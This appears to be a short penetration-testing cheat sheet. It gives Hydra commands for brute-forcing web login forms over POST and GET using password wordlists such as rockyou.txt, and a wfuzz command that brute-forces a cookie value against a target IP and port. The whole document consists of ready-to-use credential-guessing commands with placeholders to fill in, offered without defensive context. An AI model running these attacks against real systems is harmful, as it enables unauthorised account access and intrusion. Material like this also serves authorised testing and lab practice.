## POST
```
hydra -l (USERNAME) -P /path/to/wordlist.txt (TARGET IP ADDRESS) http-post-form "/URI/path/to/login.php:(HTML FORM USERNAME ATTRIBUTE)=^USER^&(HTML FORM PASSWORD ATTRIBUTE)=^PASS^&Login=Login:(FAILED LOGIN MESSAGE)"
```

## GET 
```
hydra -l admin -P /pwnt/passwords/wordlists/rockyou.txt (TARGET IP ADDRESS) http-get-form "/login.php:username=^USER^&password=^PASS^&Login=Login:Please Login|Bad Request"
```

## Fuzz cookies 

```
wfuzz -z \
 file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt\
 -b passwd=FUZZ http://(TARGET IP ADDRESS):(TARGET PORT)
```